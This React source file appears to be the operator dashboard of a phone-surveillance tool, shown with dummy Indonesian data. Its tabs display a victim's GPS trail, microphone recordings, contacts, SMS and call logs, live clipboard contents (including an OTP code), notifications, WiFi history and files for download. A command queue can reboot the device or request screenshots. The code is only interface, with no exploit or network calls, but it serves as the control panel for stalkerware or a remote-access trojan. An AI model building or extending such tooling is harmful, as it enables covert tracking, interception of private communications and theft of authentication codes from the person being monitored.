import React, { useState } from "react";
import { Tabs, Table, Button, Descriptions, Tag, List, Card } from "antd";

// Dummy data for demonstration
const user = {
  name: "Budi Santoso",
  phone: "0812xxxxxxx",
  status: "Aktif",
  lastActive: "2025-08-03 07:00",
};

const gpsLogs = [
  { time: "2025-08-01 10:23", lat: -6.200, lon: 106.816 },
  { time: "2025-08-01 12:11", lat: -6.210, lon: 106.820 },
];

const micRecordings = [
  { time: "2025-08-01 08:00", file: "audio1.mp3" },
  { time: "2025-08-02 14:10", file: "audio2.mp3" },
];

const contacts = [
  { name: "Andi", phone: "081234567890" },
  { name: "Siti", phone: "082198765432" },
];

const smsLogs = [
  { direction: "IN", from: "081211122233", body: "Halo", time: "2025-08-01 09:00" },
  { direction: "OUT", to: "081244455566", body: "Siap", time: "2025-08-01 09:05" },
];

const callLogs = [
  { type: "OUTGOING", number: "081255566677", duration: 120, time: "2025-08-01 10:00" },
  { type: "INCOMING", number: "081299988877", duration: 60, time: "2025-08-01 13:30" },
];

const installedApps = [
  { app: "WhatsApp", package: "com.whatsapp", version: "2.24.11" },
  { app: "Instagram", package: "com.instagram.android", version: "300.1.0" },
];

const permissions = [
  { permission: "GPS", status: true, updated: "2025-08-01 14:00" },
  { permission: "Microphone", status: false, updated: "2025-08-01 14:00" },
  { permission: "Contacts", status: true, updated: "2025-08-01 14:00" },
  { permission: "Camera", status: false, updated: "2025-08-01 14:00" },
];

const clipboardLogs = [
  { time: "2025-08-01 11:00", content: "Kode OTP: 123456" },
];

const notificationLogs = [
  { time: "2025-08-01 15:30", title: "WhatsApp", body: "Pesan baru masuk" },
];

const wifiLogs = [
  { ssid: "RumahAja", time: "2025-08-01 08:00", location: "Jakarta" },
  { ssid: "Kantor1", time: "2025-07-31 17:00", location: "Jakarta" },
];

const fileExplorer = [
  { path: "/storage/emulated/0/Download/file1.pdf", size: "2MB" },
  { path: "/storage/emulated/0/DCIM/photo.jpg", size: "1.2MB" },
];

const commandQueue = [
  { command: "Reboot Device", status: "Completed", time: "2025-08-01 09:00" },
  { command: "Request Screenshot", status: "Pending", time: "2025-08-01 12:05" },
];

export default function UserDetail() {
  return (
    <div style={{ maxWidth: 1000, margin: "0 auto", background: "#fff", padding: 24 }}>
      <Descriptions title="User Info" bordered column={2}>
        <Descriptions.Item label="Nama">{user.name}</Descriptions.Item>
        <Descriptions.Item label="Nomor HP">{user.phone}</Descriptions.Item>
        <Descriptions.Item label="Status">
          <Tag color={user.status === "Aktif" ? "green" : "red"}>{user.status}</Tag>
        </Descriptions.Item>
        <Descriptions.Item label="Last Active">{user.lastActive}</Descriptions.Item>
      </Descriptions>
      <Tabs style={{ marginTop: 24 }} tabPosition="top" type="card">
        <Tabs.TabPane tab="GPS Logging" key="gps">
          <Table
            dataSource={gpsLogs}
            columns={[
              { title: "Waktu", dataIndex: "time" },
              { title: "Latitude", dataIndex: "lat" },
              { title: "Longitude", dataIndex: "lon" },
            ]}
            rowKey="time"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="Microphone Recording" key="mic">
          <Table
            dataSource={micRecordings}
            columns={[
              { title: "Waktu", dataIndex: "time" },
              {
                title: "File",
                dataIndex: "file",
                render: file => <Button type="link">{file}</Button>,
              },
            ]}
            rowKey="file"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="View Contacts" key="contacts">
          <Table
            dataSource={contacts}
            columns={[
              { title: "Nama", dataIndex: "name" },
              { title: "Nomor", dataIndex: "phone" },
            ]}
            rowKey="phone"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="SMS Logs" key="sms">
          <Table
            dataSource={smsLogs}
            columns={[
              { title: "Arah", dataIndex: "direction" },
              { title: "Dari", dataIndex: "from" },
              { title: "Ke", dataIndex: "to" },
              { title: "Isi", dataIndex: "body" },
              { title: "Waktu", dataIndex: "time" },
            ]}
            rowKey={(row, idx) => idx}
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="Send SMS" key="send_sms">
          <Button type="primary">Kirim SMS ke User</Button>
        </Tabs.TabPane>
        <Tabs.TabPane tab="Call Logs" key="call">
          <Table
            dataSource={callLogs}
            columns={[
              { title: "Tipe", dataIndex: "type" },
              { title: "Nomor", dataIndex: "number" },
              { title: "Durasi (detik)", dataIndex: "duration" },
              { title: "Waktu", dataIndex: "time" },
            ]}
            rowKey={(row, idx) => idx}
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="View Installed Apps" key="apps">
          <Table
            dataSource={installedApps}
            columns={[
              { title: "Aplikasi", dataIndex: "app" },
              { title: "Package", dataIndex: "package" },
              { title: "Versi", dataIndex: "version" },
            ]}
            rowKey="package"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="View Stub Permissions" key="permissions">
          <Table
            dataSource={permissions}
            columns={[
              { title: "Permission", dataIndex: "permission" },
              {
                title: "Status",
                dataIndex: "status",
                render: s => s ? <Tag color="green">Granted</Tag> : <Tag color="red">Denied</Tag>,
              },
              { title: "Update Terakhir", dataIndex: "updated" },
            ]}
            rowKey="permission"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="Live Clipboard Logging" key="clipboard">
          <List
            dataSource={clipboardLogs}
            renderItem={item => (
              <List.Item>
                <Card title={item.time}>{item.content}</Card>
              </List.Item>
            )}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="Live Notification Logging" key="notif">
          <List
            dataSource={notificationLogs}
            renderItem={item => (
              <List.Item>
                <Card title={item.title + " (" + item.time + ")"}>
                  {item.body}
                </Card>
              </List.Item>
            )}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="View WiFi Networks" key="wifi">
          <Table
            dataSource={wifiLogs}
            columns={[
              { title: "SSID", dataIndex: "ssid" },
              { title: "Waktu", dataIndex: "time" },
              { title: "Lokasi", dataIndex: "location" },
            ]}
            rowKey="ssid"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="File Explorer & Downloader" key="files">
          <Table
            dataSource={fileExplorer}
            columns={[
              { title: "Path", dataIndex: "path" },
              { title: "Ukuran", dataIndex: "size" },
              {
                title: "Download",
                render: row => <Button>Download</Button>,
              },
            ]}
            rowKey="path"
            pagination={false}
          />
        </Tabs.TabPane>
        <Tabs.TabPane tab="Command Queuing" key="cmd">
          <Table
            dataSource={commandQueue}
            columns={[
              { title: "Perintah", dataIndex: "command" },
              { title: "Status", dataIndex: "status" },
              { title: "Waktu", dataIndex: "time" },
            ]}
            rowKey="command"
            pagination={false}
          />
        </Tabs.TabPane>
      </Tabs>
    </div>
  );
}